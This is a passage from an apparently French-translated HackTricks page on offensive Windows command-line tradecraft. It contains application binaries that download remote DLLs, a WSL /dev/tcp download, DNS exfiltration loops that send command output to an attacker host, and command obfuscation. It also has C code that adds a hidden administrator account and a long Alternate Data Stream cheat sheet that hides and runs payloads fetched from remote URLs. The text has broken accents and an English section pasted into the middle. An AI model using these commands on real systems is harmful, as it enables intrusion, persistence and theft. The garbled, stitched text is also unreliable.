Powerpnt.exe "http://192.168.1.10/TeamsAddinLoader.dll"
```
# Squirrel.exe

Squirrel.exe est un outil de d√©ploiement et de mise √† jour d'applications open source pour Windows. Il est souvent utilis√© pour d√©ployer des applications .NET et Electron. Il est important de noter que Squirrel.exe peut √™tre utilis√© pour ex√©cuter du code arbitraire sur un syst√®me Windows vuln√©rable.

## Utilisation de Squirrel.exe

Squirrel.exe est souvent utilis√© pour d√©ployer des applications .NET et Electron. Il est important de noter que Squirrel.exe peut √™tre utilis√© pour ex√©cuter du code arbitraire sur un syst√®me Windows vuln√©rable.

## D√©tection de Squirrel.exe

Squirrel.exe peut √™tre d√©tect√© en recherchant les fichiers ex√©cutables dans les r√©pertoires d'installation des applications .NET et Electron. Il peut √©galement √™tre d√©tect√© en recherchant les processus en cours d'ex√©cution sur un syst√®me Windows.

## Pr√©vention de l'utilisation malveillante de Squirrel.exe

Pour pr√©venir l'utilisation malveillante de Squirrel.exe, il est recommand√© de limiter l'acc√®s aux syst√®mes Windows vuln√©rables. Les utilisateurs doivent √©galement √™tre conscients des risques potentiels associ√©s √† l'installation d'applications tierces et doivent √©viter d'installer des applications provenant de sources non fiables.
```
squirrel.exe --download [url to package]
```
# Update.exe

`update.exe` est un fichier ex√©cutable Windows qui est souvent utilis√© pour mettre √† jour des logiciels ou des pilotes. Cependant, il peut √©galement √™tre utilis√© par des attaquants pour ex√©cuter des commandes malveillantes sur un syst√®me.

Il est important de noter que `update.exe` est un nom de fichier commun et l√©gitime, donc sa pr√©sence sur un syst√®me ne signifie pas n√©cessairement une activit√© malveillante. Cependant, il est important de surveiller les activit√©s suspectes li√©es √† ce fichier.

Les attaquants peuvent utiliser `update.exe` pour ex√©cuter des commandes malveillantes telles que l'installation de logiciels malveillants, la suppression de fichiers ou la collecte d'informations sensibles. Il est donc important de surveiller les activit√©s li√©es √† ce fichier et de s'assurer que les mises √† jour logicielles sont effectu√©es √† partir de sources l√©gitimes.

Si vous soup√ßonnez que `update.exe` est utilis√© de mani√®re malveillante sur votre syst√®me, vous pouvez effectuer une analyse antivirus compl√®te et surveiller les activit√©s suspectes √† l'aide d'outils de surveillance syst√®me tels que Process Monitor.
```
Update.exe --download [url to package]
```
Winword.exe est le processus principal de Microsoft Word, l'application de traitement de texte de la suite bureautique Microsoft Office. Ce processus est responsable de l'ex√©cution de Word et de toutes les fonctionnalit√©s associ√©es, telles que la cr√©ation, l'√©dition et l'enregistrement de documents. Les attaquants peuvent utiliser des techniques d'ing√©nierie sociale pour inciter les utilisateurs √† ouvrir des documents malveillants contenant des macros ou des exploits, qui peuvent √™tre utilis√©s pour ex√©cuter du code malveillant sur le syst√®me de l'utilisateur. Les administrateurs syst√®me peuvent surveiller l'activit√© de Winword.exe pour d√©tecter toute activit√© suspecte ou malveillante.
```
winword.exe "http://192.168.1.10/TeamsAddinLoader.dll"
```
Wsl.exe est un outil de ligne de commande qui permet d'interagir avec le sous-syst√®me Windows pour Linux (WSL). Il peut √™tre utilis√© pour g√©rer les distributions Linux install√©es sur Windows 10, ainsi que pour ex√©cuter des commandes Linux directement √† partir de l'invite de commande Windows. Les utilisateurs peuvent √©galement utiliser Wsl.exe pour ex√©cuter des scripts shell Linux √† partir de l'invite de commande Windows.
```
wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
```
## Divers
```bash
cd #Get current dir
cd C:\path\to\dir #Change dir
dir #List current dir
dir /a:h C:\path\to\dir #List hidden files
dir /s /b #Recursive list without shit
time #Get current time
date #Get current date
shutdown /r /t 0 #Shutdown now
type <file> #Cat file

#Runas
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe" #Use saved credentials
runas /netonly /user:<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Hide
attrib +h file #Set Hidden
attrib -h file #Quit Hidden

#Give full control over a file that you owns
icacls <FILE_PATH> /t /e /p <USERNAME>:F
icacls <FILE_PATH> /e /r <USERNAME> #Remove the permision

#Recursive copy to smb
xcopy /hievry C:\Users\security\.yawcam \\10.10.14.13\name\win

#exe2bat to transform exe file in bat file

#ADS
dir /r #Detect ADS
more file.txt:ads.txt #read ADS
powershell (Get-Content file.txt -Stream ads.txt)

# Get error messages from code
net helpmsg 32 #32 is the code in that case
```
### Contourner la liste noire de caract√®res
```bash
echo %HOMEPATH:~6,-11%   #\
who^ami   #whoami
```
### DOSfuscation

G√©n√®re une ligne de commande CMD obfusqu√©e
```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
help
SET COMMAND type C:\Users\Administrator\Desktop\flag.txt
encoding
```
### ACL des adresses d'√©coute

Vous pouvez √©couter sur [http://+:80/Temporary\_Listen\_Addresses/](http://+/Temporary\_Listen\_Addresses/) sans √™tre administrateur.
```bash
netsh http show urlacl
```
### Shell DNS manuel

**L'attaquant** (Kali) doit utiliser l'une de ces deux options :
```bash
sudo responder -I <iface> #Active
sudo tcpdump -i <iface> -A proto udp and dst port 53 and dst ip <KALI_IP> #Passive
```
#### Victime

_**for /f tokens**_ \_\*\*\_technique : Cela nous permet d'ex√©cuter des commandes, d'obtenir les X premiers mots de chaque ligne et de les envoyer via DNS √† notre serveur.
```
for /f %a in ('whoami') do nslookup %a <IP_kali> #Get whoami
for /f "tokens=2" %a in ('echo word1 word2') do nslookup %a <IP_kali> #Get word2
for /f "tokens=1,2,3" %a in ('dir /B C:\') do nslookup %a.%b.%c <IP_kali> #List folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)"') do nslookup %a.%b.%c <IP_kali> #List that folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Progra~2"') do nslookup %a.%b.%c <IP_kali> #Same as last one
#More complex commands
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('whoami /priv ^| findstr /i "enable"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali> #Same as last one
```
Vous pouvez √©galement **rediriger** la sortie, puis la **lire**.
```
whoami /priv | finstr "Enab" > C:\Users\Public\Documents\out.txt
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('type "C:\Users\Public\Documents\out.txt"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali>
```
## Appeler CMD depuis du code C

---

### Introduction

In some cases, it may be necessary to call the Windows command prompt (CMD) from C code. This can be useful for automating certain tasks or executing specific commands.

### Using system()

The simplest way to call CMD from C code is to use the `system()` function. This function allows you to execute a command as if it were typed into the command prompt.

Here's an example:

```c
#include <stdlib.h>

int main()
{
    system("cmd /c dir");
    return 0;
}
```

In this example, the `system()` function is used to execute the `dir` command in CMD. The `/c` flag is used to indicate that the command should be executed and then CMD should exit.

### Using CreateProcess()

Another way to call CMD from C code is to use the `CreateProcess()` function. This function allows you to create a new process and execute a command within that process.

Here's an example:

```c
#include <windows.h>

int main()
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Start the child process.
    if (!CreateProcess(NULL,   // No module name (use command line)
        "cmd /c dir",          // Command line
        NULL,                  // Process handle not inheritable
        NULL,                  // Thread handle not inheritable
        FALSE,                 // Set handle inheritance to FALSE
        0,                     // No creation flags
        NULL,                  // Use parent's environment block
        NULL,                  // Use parent's starting directory
        &si,                   // Pointer to STARTUPINFO structure
        &pi)                   // Pointer to PROCESS_INFORMATION structure
        )
    {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return 1;
    }

    // Wait until child process exits.
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles.
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
```

In this example, the `CreateProcess()` function is used to create a new process and execute the `dir` command in CMD. The `STARTUPINFO` and `PROCESS_INFORMATION` structures are used to specify various options for the new process, such as the command line to execute and the environment block to use.

### Conclusion

Calling CMD from C code can be useful for automating tasks or executing specific commands. The `system()` function is the simplest way to do this, while the `CreateProcess()` function provides more control over the new process.
```c
#include <stdlib.h>     /* system, NULL, EXIT_FAILURE */

// When executed by Administrator this program will create a user and then add him to the administrators group
// i686-w64-mingw32-gcc addmin.c -o addmin.exe
// upx -9 addmin.exe

int main (){
    int i;
    i=system("net users otherAcc 0TherAcc! /add");
    i=system("net localgroup administrators otherAcc /add");
    return 0;
}
```
## Feuille de triche des flux de donn√©es alternatifs (ADS/Alternate Data Stream)

Extrait de [https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)
```bash
##Add content to ADS###
type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe
findstr /V /L W3AllLov3DonaldTrump c:\ADS\procexp.exe > c:\ADS\file.txt:procexp.exe
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab
print /D:c:\ads\file.txt:autoruns.exe c:\ads\Autoruns.exe
reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ads\file.txt:evilreg.reg
regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat
esentutl.exe /y C:\ADS\autoruns.exe /d c:\ADS\file.txt:autoruns.exe /o
powershell -command " & {(Get-Content C:\ADS\file.exe -Raw | Set-Content C:\ADS\file.txt -Stream file.exe)}"
curl file://c:/temp/autoruns.exe --output c:\temp\textfile1.txt:auto.exe
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://evilsite.com/RegSvr32.sct   ^scrobj.dll > fakefile.doc:reg32.bat
set-content - path {path to the file} - stream {name of the stream}

## Discover ADS contecnt
dir /R 
streams.exe <c:\path\to\file> #Binary from sysinternals#
Get-Item -Path .\fie.txt -Stream *
gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'

##Extract content from ADS###
expand c:\ads\file.txt:test.exe c:\temp\evil.exe
esentutl.exe /Y C:\temp\file.txt:test.exe /d c:\temp\evil.exe /o
more < c:\ads\file.txt:test.exe

##Executing the ADS content###

* WMIC
wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'

* Rundll32
rundll32 "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:ADSDLL.dll",DllMain
rundll32.exe advpack.dll,RegisterOCX not_a_dll.txt:test.dll
rundll32.exe ieadvpack.dll,RegisterOCX not_a_dll.txt:test.dll

* Cscript
cscript "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Script.vbs"

* Wscript
wscript c:\ads\file.txt:script.vbs
echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > %temp%\test.txt:hi.js && wscript.exe %temp%\test.txt:hi.js

* Forfiles
forfiles /p c:\windows\system32 /m notepad.exe /c "c:\temp\shellloader.dll:bginfo.exe"

* Mavinject.exe
c:\windows\SysWOW64\notepad.exe
tasklist | findstr notepad
notepad.exe                   4172 31C5CE94259D4006           2     18,476 K
type c:\temp\AtomicTest.dll > "c:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Atomic.dll"
c:\windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.16299.15_none_e07aa28c97ebfa48\mavinject.exe 4172 /INJECTRUNNING "c:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Atomic.dll"

* MSHTA
mshta "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:helloworld.hta"
(Does not work on Windows 10 1903 and newer)

* Control.exe
control.exe c:\windows\tasks\zzz:notepad_reflective_x64.dll
https://twitter.com/bohops/status/954466315913310209

* Create service and run
sc create evilservice binPath= "\"c:\ADS\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto
sc start evilservice
https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/

* Powershell.exe
powershell -ep bypass - < c:\temp:ttt

* Powershell.exe
powershell -command " & {(Get-Content C:\ADS\1.txt -Stream file.exe -Raw | Set-Content c:\ADS\file.exe) | start-process c:\ADS\file.exe}"

* Powershell.exe
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = C:\ads\folder:file.exe}

* Regedit.exe
regedit c:\ads\file.txt:regfile.reg

* Bitsadmin.exe
bitsadmin /create myfile
bitsadmin /addfile myfile c:\windows\system32\notepad.exe c:\data\playfolder\notepad.exe
bitsadmin /SetNotifyCmdLine myfile c:\ADS\1.txt:cmd.exe NULL
bitsadmin /RESUME myfile

* AppVLP.exe
AppVLP.exe c:\windows\tracing\test.txt:ha.exe

* Cmd.exe
cmd.exe - < fakefile.doc:reg32.bat
https://twitter.com/yeyint_mth/status/1143824979139579904

* Ftp.exe
ftp -s:fakefile.txt:aaaa.txt
https://github.com/sailay1996/misc-bin/blob/master/ads.md

* ieframe.dll , shdocvw.dll (ads)
echo [internetshortcut] > fake.txt:test.txt && echo url=C:\windows\system32\calc.exe >> fake.txt:test.txt rundll32.exe ieframe.dll,OpenURL C:\temp\ads\fake.txt:test.txt
rundll32.exe shdocvw.dll,OpenURL C:\temp\ads\fake.txt:test.txt
https://github.com/sailay1996/misc-bin/blob/master/ads.md

* bash.exe
echo calc > fakefile.txt:payload.sh && bash < fakefile.txt:payload.sh
bash.exe -c $(fakefile.txt:payload.sh)
https://github.com/sailay1996/misc-bin/blob/master/ads.md

* Regsvr32
type c:\Windows\System32\scrobj.dll > Textfile.txt:LoveADS
regsvr32 /s /u /i:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct Textfile.txt:LoveADS
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre entreprise annonc√©e dans HackTricks ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live).
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
